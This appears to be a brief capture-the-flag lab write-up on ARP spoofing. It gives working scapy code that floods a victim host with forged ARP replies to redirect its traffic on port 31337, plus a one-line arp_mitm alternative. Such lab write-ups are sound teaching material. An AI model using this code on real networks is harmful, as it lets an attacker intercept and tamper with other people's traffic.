This level requires us to hijack traffic of a remote host `10.0.0.4` who's communicating with `10.0.0.2` on port `31337`. We need to send an ARP `is-at` packet to `10.0.0.4` telling it that `10.0.0.2` is at this MAC address, when in reality, the MAC address is actually our MAC address. We send the packet repeatedly so that even if `10.0.0.2` tries to send an `is-at` request, we'd send one immediately after, effectively overwriting `10.0.0.4` ARP table, so that all of the request would go to us instead of `10.0.0.2`.

```python
from scapy.all import *

arp = ARP(psrc="10.0.0.2", pdst="10.0.0.4", hwsrc="42:90:81:0d:9a:18", hwdst=getmacbyip("10.0.0.4"), op=2)

while True:
	send(arp)
```

Alternatively, `scapy` also offer a man-in-the-middle function out of the box. So we could just type this:

```python
from scapy.all import *

arp_mitm("10.0.0.4", "10.0.0.2")
```